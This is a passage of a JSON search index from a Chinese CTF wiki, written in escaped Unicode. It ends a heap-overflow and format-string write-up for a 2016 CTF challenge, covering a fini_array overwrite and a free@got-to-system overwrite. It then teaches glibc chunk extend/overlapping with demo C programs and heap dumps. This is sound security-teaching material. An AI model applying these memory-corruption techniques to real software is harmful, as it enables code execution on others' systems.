\u7684\u6f0f\u6d1e\u3002\n\n\n\u63d0\u4ea4\u8ba2\u5355\uff0c\u5c06\u4e24\u672c\u4e66\u7684\u540d\u5b57\u5408\u5728\u4e00\u8d77\u3002\u8fd9\u91cc\u7531\u4e8e\u4e0a\u9762\u5806\u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u8fd9\u91cc\u4e5f\u4f1a\u51fa\u73b0\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\n\n\n\u6b64\u5916\uff0c\u5728\u7a0b\u5e8f\u9000\u51fa\u4e4b\u524d\u5b58\u5728\u4e00\u4e2a\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\n\u3002\n\n\n\n\n\u8fd9\u91cc\u867d\u7136\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u80fd\u529b\u5f88\u5f3a\uff0c\u4f46\u662f\u6240\u6709\u8fdb\u884c malloc \u7684\u5927\u5c0f\u90fd\u662f\u5b8c\u5168\u56fa\u5b9a\u7684\uff0c\u6211\u4eec\u53ea\u80fd\u501f\u52a9\u8fd9\u4e9b\u5206\u914d\u7684 chunk \u6765\u8fdb\u884c\u64cd\u4f5c\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u7a0b\u5e8f\u4e2d\u4e3b\u8981\u7684\u6f0f\u6d1e\u5728\u4e8e\u5806\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u4f46\u662f\u5982\u679c\u60f3\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u5fc5\u7136\u9700\u8981\u6ea2\u51fa\u5bf9\u5e94\u7684dest \u6570\u7ec4\u3002\u5177\u4f53\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528\u5806\u6ea2\u51fa\u8fdb\u884c chunk extend\uff0c\u4f7f\u5f97\u5728 submit \u4e2d \nmalloc(0x140uLL)\n \u65f6\uff0c\u6070\u597d\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u8ba2\u5355\u5904\u7684\u4f4d\u7f6e\u3002\u5728 submit \u4e4b\u524d\uff0c\u5e03\u7f6e\u597d\u5806\u5185\u5b58\u5e03\u5c40\uff0c\u4f7f\u5f97\u628a\u5b57\u7b26\u4e32\u62fc\u63a5\u540e\u6070\u597d\u53ef\u4ee5\u8986\u76d6 dest \u4e3a\u6307\u5b9a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3002\n\n\n\u901a\u8fc7\u6784\u9020 dest \u4e3a\u6307\u5b9a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a\u4e00\u65b9\u9762\u6cc4\u6f0f __libc_start_main_ret \u7684\u5730\u5740\uff0c\n\u4e00\u65b9\u9762\u63a7\u5236\u7a0b\u5e8f\u91cd\u65b0\u8fd4\u56de\u6267\u884c\n\u3002\u8fd9\u65f6\uff0c\u4fbf\u53ef\u4ee5\u77e5\u9053 libc \u57fa\u5730\u5740\uff0csystem \u7b49\u5730\u5740\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u7531\u4e8e\u4e00\u65e6 submit \u4e4b\u540e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u76f4\u63a5\u76f4\u63a5\u9000\u51fa\uff0c\u6240\u4ee5\u6211\u4eec\u6bd4\u8f83\u597d\u7684\u601d\u8def\u5c31\u662f\u4fee\u6539 fini_array \u4e2d\u7684\u53d8\u91cf\uff0c\u4ee5\u4fbf\u4e8e\u8fbe\u5230\u7a0b\u5e8f\u6267\u884c\u5b8c\u6bd5\u540e\uff0c\n\u91cd\u65b0\u8fd4\u56de\u6211\u4eec\u671f\u5f85\u7684\u4f4d\u7f6e\n\u3002\u8fd9\u91cc\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u4e2atrick\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u8bfb\u53d6\u9009\u62e9\u7684\u65f6\u5019\u4f1a\u8bfb\u53d6 128 \u5927\u5c0f\uff0c\u5728\u6808\u4e0a\u3002\u800c\u7a0b\u5e8f\u6700\u540e\u5728\u8f93\u51fa dest \u7684\u65f6\u5019\uff0c\u4e4b\u524d\u6240\u8bfb\u53d6\u7684\u90a3\u90e8\u5206\u9009\u62e9\u5fc5\u7136\u662f\u5728\u6808\u4e0a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5982\u679c\u6211\u4eec\u5728\u6808\u4e0a\u9884\u5148\u5e03\u7f6e\u597d\u4e00\u4e9b\u63a7\u5236\u6d41\u6307\u9488\uff0c\u90a3\u5c31\u53ef\u4ee5\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002\n\n\n\u518d\u6b21\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u8986\u76d6 free@got \u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u8fbe\u5230\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u76ee\u7684\u3002\n\n\n\n\n\u8fd9\u91cc\uff0c\u5404\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u662f\n\n\n\n\nFini_array0 : 5+8=13\n\n\n__libc_start_main_ret : 5+0x1a=31\u3002\n\n\n\n\n00:0000\u2502 rsp  0x7ffe6a7f3ec8 \u2014\u25b8 0x400c93 \u25c2\u2014 mov    eax, 0\n01:0008\u2502      0x7ffe6a7f3ed0 \u25c2\u2014 0x100000000\n02:0010\u2502      0x7ffe6a7f3ed8 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f (\nOrder 1:\n)\n03:0018\u2502      0x7ffe6a7f3ee0 \u2014\u25b8 0x400d38 \u25c2\u2014 pop    rcx\n04:0020\u2502      0x7ffe6a7f3ee8 \u2014\u25b8 0x9f2010 \u25c2\u2014 0x6666666666667325 (\n%sffffff\n)\n05:0028\u2502      0x7ffe6a7f3ef0 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f (\nOrder 1:\n)\n06:0030\u2502      0x7ffe6a7f3ef8 \u2014\u25b8 0x9f2130 \u25c2\u2014 0x6564724f203a3220 (\n 2: Orde\n)\n07:0038\u2502      0x7ffe6a7f3f00 \u25c2\u2014 0xa35 /* \n5\\n\n */\n08:0040\u2502      0x7ffe6a7f3f08 \u25c2\u2014 0x0\n... \u2193\n0b:0058\u2502      0x7ffe6a7f3f20 \u25c2\u2014 0xff00000000000000\n0c:0060\u2502      0x7ffe6a7f3f28 \u25c2\u2014 0x0\n... \u2193\n0f:0078\u2502      0x7ffe6a7f3f40 \u25c2\u2014 0x5f5f00656d697474 /* \nttime\n */\n10:0080\u2502      0x7ffe6a7f3f48 \u25c2\u2014 0x7465675f6f736476 (\nvdso_get\n)\n11:0088\u2502      0x7ffe6a7f3f50 \u25c2\u2014 0x1\n12:0090\u2502      0x7ffe6a7f3f58 \u2014\u25b8 0x400cfd \u25c2\u2014 add    rbx, 1\n13:0098\u2502      0x7ffe6a7f3f60 \u25c2\u2014 0x0\n... \u2193\n15:00a8\u2502      0x7ffe6a7f3f70 \u2014\u25b8 0x400cb0 \u25c2\u2014 push   r15\n16:00b0\u2502      0x7ffe6a7f3f78 \u2014\u25b8 0x400780 \u25c2\u2014 xor    ebp, ebp\n17:00b8\u2502      0x7ffe6a7f3f80 \u2014\u25b8 0x7ffe6a7f4070 \u25c2\u2014 0x1\n18:00c0\u2502      0x7ffe6a7f3f88 \u25c2\u2014 0xd8d379f22453ff00\n19:00c8\u2502 rbp  0x7ffe6a7f3f90 \u2014\u25b8 0x400cb0 \u25c2\u2014 push   r15\n1a:00d0\u2502      0x7ffe6a7f3f98 \u2014\u25b8 0x7f9db2113830 (__libc_start_main+240) \u25c2\u2014 mov    edi, eax\n\n\n\n\n\uff01\uff01\uff01\u5f85\u8865\u5145\uff01\uff01\uff01\n\n\n\u9898\u76ee\n\n\n\n\n2016 Nuit du Hack CTF Quals : night deamonic heap", 
            "title": "Chunk Extend / Overlapping"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#chunk-extend-and-overlapping", 
            "text": "", 
            "title": "Chunk Extend and Overlapping"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#_1", 
            "text": "chunk extend\u662f\u5806\u6f0f\u6d1e\u7684\u4e00\u79cd\u5e38\u89c1\u5229\u7528\u624b\u6cd5\uff0c\u901a\u8fc7extend\u53ef\u4ee5\u5b9e\u73b0chunk overlapping\u7684\u6548\u679c\u3002\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u9700\u8981\u4ee5\u4e0b\u7684\u65f6\u673a\u548c\u6761\u4ef6\uff1a   \u7a0b\u5e8f\u4e2d\u5b58\u5728\u57fa\u4e8e\u5806\u7684\u6f0f\u6d1e  \u6f0f\u6d1e\u53ef\u4ee5\u63a7\u5236 chunk header \u4e2d\u7684\u6570\u636e", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#_2", 
            "text": "chunk extend\u6280\u672f\u80fd\u591f\u4ea7\u751f\u7684\u539f\u56e0\u5728\u4e8eptmalloc\u5728\u5bf9\u5806chunk\u8fdb\u884c\u64cd\u4f5c\u65f6\u4f7f\u7528\u7684\u5404\u79cd\u5b8f\u3002  \u5728ptmalloc\u4e2d\uff0c\u83b7\u53d6 chunk \u5757\u5927\u5c0f\u7684\u64cd\u4f5c\u5982\u4e0b /* Get size, ignoring use bits */\n#define chunksize(p) (chunksize_nomask(p)   ~(SIZE_BITS))\n\n/* Like chunksize, but do not mask SIZE_BITS.  */\n#define chunksize_nomask(p) ((p)- mchunk_size) \n\u4e00\u79cd\u662f\u76f4\u63a5\u83b7\u53d6 chunk \u7684\u5927\u5c0f\uff0c\u4e0d\u5ffd\u7565\u63a9\u7801\u90e8\u5206\uff0c\u53e6\u5916\u4e00\u79cd\u662f\u5ffd\u7565\u63a9\u7801\u90e8\u5206\u3002  \u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6\u4e0b\u4e00 chunk \u5757\u5730\u5740\u7684\u64cd\u4f5c\u5982\u4e0b /* Ptr to next physical malloc_chunk. */\n#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) \n\u5373\u4f7f\u7528\u5f53\u524d\u5757\u6307\u9488\u52a0\u4e0a\u5f53\u524d\u5757\u5927\u5c0f\u3002  \u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6\u524d\u4e00\u4e2a chunk \u4fe1\u606f\u7684\u64cd\u4f5c\u5982\u4e0b /* Size of the chunk below P.  Only valid if prev_inuse (P).  */\n#define prev_size(p) ((p)- mchunk_prev_size)\n\n/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */\n#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) \n\u5373\u901a\u8fc7malloc_chunk- prev_size\u83b7\u53d6\u524d\u4e00\u5757\u5927\u5c0f\uff0c\u7136\u540e\u4f7f\u7528\u672c chunk \u5730\u5740\u51cf\u53bb\u6240\u5f97\u5927\u5c0f\u3002  \u5728 ptmalloc\uff0c\u5224\u65ad\u5f53\u524d chunk \u662f\u5426\u662fuse\u72b6\u6001\u7684\u64cd\u4f5c\u5982\u4e0b\uff1a #define inuse(p)\n    ((((mchunkptr)(((char *) (p)) + chunksize(p)))- mchunk_size)   PREV_INUSE) \n\u5373\u67e5\u770b\u4e0b\u4e00 chunk \u7684 prev_inuse \u57df\uff0c\u800c\u4e0b\u4e00\u5757\u5730\u5740\u53c8\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\u662f\u6839\u636e\u5f53\u524d chunk \u7684 size \u8ba1\u7b97\u5f97\u51fa\u7684\u3002  \u66f4\u591a\u7684\u64cd\u4f5c\u8be6\u89c1  \u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784  \u4e00\u8282\u3002  \u901a\u8fc7\u4e0a\u9762\u51e0\u4e2a\u5b8f\u53ef\u4ee5\u770b\u51fa\uff0cptmalloc\u901a\u8fc7chunk header\u7684\u6570\u636e\u5224\u65adchunk\u7684\u4f7f\u7528\u60c5\u51b5\u548c\u5bf9chunk\u7684\u524d\u540e\u5757\u8fdb\u884c\u5b9a\u4f4d\u3002\u7b80\u800c\u8a00\u4e4b\uff0cchunk extend\u5c31\u662f\u901a\u8fc7\u63a7\u5236size\u548cpre_size\u57df\u6765\u5b9e\u73b0\u8de8\u8d8a\u5757\u64cd\u4f5c\u4ece\u800c\u5bfc\u81f4overlapping\u7684\u3002  \u4e0echunk extend\u7c7b\u4f3c\u7684\u8fd8\u6709\u4e00\u79cd\u79f0\u4e3achunk shrink\u7684\u64cd\u4f5c\u3002\u8fd9\u91cc\u53ea\u4ecb\u7ecdchunk extend\u7684\u5229\u7528\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#1inusefastbinextend", 
            "text": "\u7b80\u5355\u6765\u8bf4\uff0c\u8be5\u5229\u7528\u7684\u6548\u679c\u662f\u901a\u8fc7\u66f4\u6539\u7b2c\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u6765\u63a7\u5236\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9\u3002 \u6ce8\u610f\uff0c\u6211\u4eec\u7684\u793a\u4f8b\u90fd\u662f\u572864\u4f4d\u7684\u7a0b\u5e8f\u3002\u5982\u679c\u60f3\u572832\u4f4d\u4e0b\u8fdb\u884c\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u628a8\u5b57\u8282\u504f\u79fb\u6539\u4e3a4\u5b57\u8282 \u3002 int main(void)\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x10);//\u5206\u914d\u7b2c\u4e00\u4e2a0x10\u7684chunk\n    malloc(0x10);//\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk\n\n    *(long long *)((long long)ptr-0x8)=0x41;// \u4fee\u6539\u7b2c\u4e00\u4e2a\u5757\u7684size\u57df\n\n    free(ptr);\n    ptr1=malloc(0x30);// \u5b9e\u73b0 extend\uff0c\u63a7\u5236\u4e86\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9\n    return 0;\n} \n\u5f53\u4e24\u4e2amalloc\u8bed\u53e5\u6267\u884c\u4e4b\u540e\uff0c\u5806\u7684\u5185\u5b58\u5206\u5e03\u5982\u4e0b 0x602000:   0x0000000000000000  0x0000000000000021  === chunk 1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021  === chunk 2\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1  === top chunk \n\u4e4b\u540e\uff0c\u6211\u4eec\u628a chunk1 \u7684 size \u57df\u66f4\u6539\u4e3a 0x41\uff0c0x41 \u662f\u56e0\u4e3a chunk \u7684 size \u57df\u5305\u542b\u4e86\u7528\u6237\u63a7\u5236\u7684\u5927\u5c0f\u548c header \u7684\u5927\u5c0f\u3002\u5982\u4e0a\u6240\u793a\u6b63\u597d\u5927\u5c0f\u4e3a0x40\u3002\u5728\u9898\u76ee\u4e2d\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7531\u5806\u6ea2\u51fa\u5f97\u5230\u3002 0x602000:   0x0000000000000000  0x0000000000000041  === \u7be1\u6539\u5927\u5c0f\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1  \n\u6267\u884c free \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 chunk2 \u4e0e chunk1 \u5408\u6210\u4e00\u4e2a 0x40 \u5927\u5c0f\u7684 chunk\uff0c\u4e00\u8d77\u91ca\u653e\u4e86\u3002 Fastbins[idx=0, size=0x10] 0x00\nFastbins[idx=1, size=0x20] 0x00\nFastbins[idx=2, size=0x30]  \u2190  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) \nFastbins[idx=3, size=0x40] 0x00\nFastbins[idx=4, size=0x50] 0x00\nFastbins[idx=5, size=0x60] 0x00\nFastbins[idx=6, size=0x70] 0x00 \n\u4e4b\u540e\u6211\u4eec\u901a\u8fc7 malloc(0x30) \u5f97\u5230 chunk1+chunk2 \u7684\u5757\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236chunk2\u4e2d\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u4e5f\u628a\u8fd9\u79cd\u72b6\u6001\u79f0\u4e3a overlapping chunk\u3002 call   0x400450  malloc@plt \nmov    QWORD PTR [rbp-0x8], rax\n\nrax = 0x602010", 
            "title": "\u57fa\u672c\u793a\u4f8b1\uff1a\u5bf9inuse\u7684fastbin\u8fdb\u884cextend"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#2inusesmallbinextend", 
            "text": "\u901a\u8fc7\u4e4b\u524d\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5f97\u77e5\u5904\u4e8e fastbin \u8303\u56f4\u7684 chunk \u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u5165 fastbin \u94fe\u8868\u4e2d\uff0c\u800c\u4e0d\u5904\u4e8e\u8fd9\u4e2a\u8303\u56f4\u7684 chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u4e8eunsorted bin\u94fe\u8868\u4e2d\u3002\n\u4ee5\u4e0b\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 0x80 \u8fd9\u4e2a\u5927\u5c0f\u6765\u5206\u914d\u5806\uff08\u4f5c\u4e3a\u5bf9\u6bd4\uff0cfastbin \u9ed8\u8ba4\u7684\u6700\u5927\u7684 chunk \u53ef\u4f7f\u7528\u8303\u56f4\u662f0x70\uff09 int main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x80);//\u5206\u914d\u7b2c\u4e00\u4e2a 0x80 \u7684chunk1\n    malloc(0x10); //\u5206\u914d\u7b2c\u4e8c\u4e2a 0x10 \u7684chunk2\n    malloc(0x10); //\u9632\u6b62\u4e0etop chunk\u5408\u5e76\n\n    *(int *)((int)ptr-0x8)=0xb1;\n    free(ptr);\n    ptr1=malloc(0xa0);\n} \n\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u56e0\u4e3a\u5206\u914d\u7684 size \u4e0d\u5904\u4e8e fastbin \u7684\u8303\u56f4\uff0c\u56e0\u6b64\u5728\u91ca\u653e\u65f6\u5982\u679c\u4e0e top chunk \u76f8\u8fde\u4f1a\u5bfc\u81f4\u548ctop chunk\u5408\u5e76\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u989d\u5916\u5206\u914d\u4e00\u4e2achunk\uff0c\u628a\u91ca\u653e\u7684\u5757\u4e0etop chunk\u9694\u5f00\u3002 0x602000:   0x0000000000000000  0x00000000000000b1  ===chunk1 \u7be1\u6539size\u57df\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021  === chunk2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000021  === \u9632\u6b62\u5408\u5e76\u7684chunk\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000020f31  === top chunk \n\u91ca\u653e\u540e\uff0cchunk1 \u628a chunk2 \u7684\u5185\u5bb9\u541e\u5e76\u6389\u5e76\u4e00\u8d77\u7f6e\u5165unsorted bin 0x602000:   0x0000000000000000  0x00000000000000b1  === \u88ab\u653e\u5165unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x00000000000000b0  0x0000000000000020  === \u6ce8\u610f\u6b64\u5904\u6807\u8bb0\u4e3a\u7a7a\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000020f31  === top chunk  [+] unsorted_bins[0]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE) \n\u518d\u6b21\u8fdb\u884c\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u53d6\u56de chunk1 \u548c chunk2 \u7684\u7a7a\u95f4\uff0c\u6b64\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236 chunk2 \u4e2d\u7684\u5185\u5bb9      0x4005b0  main+74         call   0x400450  malloc@plt \n \u2192   0x4005b5  main+79         mov    QWORD PTR [rbp-0x8], rax\n\n     rax : 0x0000000000602010", 
            "title": "\u57fa\u672c\u793a\u4f8b2\uff1a\u5bf9inuse\u7684smallbin\u8fdb\u884cextend"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#3freesmallbinextend", 
            "text": "\u793a\u4f8b3\u662f\u5728\u793a\u4f8b2\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u7684\uff0c\u8fd9\u6b21\u6211\u4eec\u5148\u91ca\u653e chunk1\uff0c\u7136\u540e\u518d\u4fee\u6539\u5904\u4e8e unsorted bin \u4e2d\u7684 chunk1 \u7684size\u57df\u3002 int main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x80);//\u5206\u914d\u7b2c\u4e00\u4e2a0x80\u7684chunk1\n    malloc(0x10);//\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk2\n\n    free(ptr);//\u9996\u5148\u8fdb\u884c\u91ca\u653e\uff0c\u4f7f\u5f97chunk1\u8fdb\u5165unsorted bin\n\n    *(int *)((int)ptr-0x8)=0xb1;\n    ptr1=malloc(0xa0);\n} \n\u4e24\u6b21 malloc \u4e4b\u540e\u7684\u7ed3\u679c\u5982\u4e0b 0x602000:   0x0000000000000000  0x0000000000000091  === chunk 1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021  === chunk 2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51 \n\u6211\u4eec\u9996\u5148\u91ca\u653echunk1\u4f7f\u5b83\u8fdb\u5165unsorted bin\u4e2d      unsorted_bins[0]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)\n\n0x602000:   0x0000000000000000  0x0000000000000091  === \u8fdb\u5165unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000090  0x0000000000000020  === chunk 2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51  === top chunk \n\u7136\u540e\u7be1\u6539chunk1\u7684size\u57df 0x602000:   0x0000000000000000  0x00000000000000b1  === size\u57df\u88ab\u7be1\u6539\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000090  0x0000000000000020\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51 \n\u6b64\u65f6\u518d\u8fdb\u884c malloc \u5206\u914d\u5c31\u53ef\u4ee5\u5f97\u5230 chunk1+chunk2 \u7684\u5806\u5757\uff0c\u4ece\u800c\u63a7\u5236\u4e86chunk2 \u7684\u5185\u5bb9\u3002", 
            "title": "\u57fa\u672c\u793a\u4f8b3\uff1a\u5bf9free\u7684smallbin\u8fdb\u884cextend"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#chunk-extendshrink", 
            "text": "\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u79cd\u6280\u672f\u5e76\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4f46\u662f\u53ef\u4ee5\u63a7\u5236chunk\u4e2d\u7684\u5185\u5bb9\u3002\u5982\u679c chunk \u5b58\u5728\u5b57\u7b26\u4e32\u6307\u9488\u3001\u51fd\u6570\u6307\u9488\u7b49\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6307\u9488\u6765\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f\u548c\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002  \u6b64\u5916\u901a\u8fc7extend\u53ef\u4ee5\u5b9e\u73b0chunk overlapping\uff0c\u901a\u8fc7overlapping\u53ef\u4ee5\u63a7\u5236chunk\u7684fd/bk\u6307\u9488\u4ece\u800c\u53ef\u4ee5\u5b9e\u73b0 fastbin attack \u7b49\u5229\u7528\u3002", 
            "title": "Chunk Extend/Shrink \u53ef\u4ee5\u505a\u4ec0\u4e48"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#4extendoverlapping", 
            "text": "\u8fd9\u91cc\u5c55\u793a\u901a\u8fc7extend\u8fdb\u884c\u540e\u5411overlapping\uff0c\u8fd9\u4e5f\u662f\u5728CTF\u4e2d\u6700\u5e38\u51fa\u73b0\u7684\u60c5\u51b5\uff0c\u901a\u8fc7overlapping\u53ef\u4ee5\u5b9e\u73b0\u5176\u5b83\u7684\u4e00\u4e9b\u5229\u7528\u3002 int main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x10);//\u5206\u914d\u7b2c1\u4e2a 0x80 \u7684chunk1\n    malloc(0x10); //\u5206\u914d\u7b2c2\u4e2a 0x10 \u7684chunk2\n    malloc(0x10); //\u5206\u914d\u7b2c3\u4e2a 0x10 \u7684chunk3\n    malloc(0x10); //\u5206\u914d\u7b2c4\u4e2a 0x10 \u7684chunk4    \n    *(int *)((int)ptr-0x8)=0x61;\n    free(ptr);\n    ptr1=malloc(0x50);\n} \n\u5728malloc(0x50)\u5bf9extend\u533a\u57df\u91cd\u65b0\u5360\u4f4d\u540e\uff0c\u5176\u4e2d0x10\u7684fastbin\u5757\u4f9d\u7136\u53ef\u4ee5\u6b63\u5e38\u7684\u5206\u914d\u548c\u91ca\u653e\uff0c\u6b64\u65f6\u5df2\u7ecf\u6784\u6210overlapping\uff0c\u901a\u8fc7\u5bf9overlapping\u7684\u8fdb\u884c\u64cd\u4f5c\u53ef\u4ee5\u5b9e\u73b0fastbin attack\u3002", 
            "title": "\u57fa\u672c\u793a\u4f8b4\uff1a\u901a\u8fc7extend\u540e\u5411overlapping"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#5extendoverlapping", 
            "text": "\u8fd9\u91cc\u5c55\u793a\u901a\u8fc7\u4fee\u6539pre_inuse\u57df\u548cpre_size\u57df\u5b9e\u73b0\u5408\u5e76\u524d\u9762\u7684\u5757 int main(void)\n{\n    void *ptr1,*ptr2,*ptr3,*ptr4;\n    ptr1=malloc(128);//smallbin1\n    ptr2=malloc(0x10);//fastbin1\n    ptr3=malloc(0x10);//fastbin2\n    ptr4=malloc(128);//smallbin2\n    malloc(0x10);//\u9632\u6b62\u4e0etop\u5408\u5e76\n    free(ptr1);\n    *(int *)((long long)ptr4-0x8)=0x90;//\u4fee\u6539pre_inuse\u57df\n    *(int *)((long long)ptr4-0x10)=0xd0;//\u4fee\u6539pre_size\u57df\n    free(ptr4);//unlink\u8fdb\u884c\u524d\u5411extend\n    malloc(0x150);//\u5360\u4f4d\u5757\n\n} \n\u524d\u5411extend\u5229\u7528\u4e86smallbin\u7684unlink\u673a\u5236\uff0c\u901a\u8fc7\u4fee\u6539pre_size\u57df\u53ef\u4ee5\u8de8\u8d8a\u591a\u4e2achunk\u8fdb\u884c\u5408\u5e76\u5b9e\u73b0overlapping\u3002", 
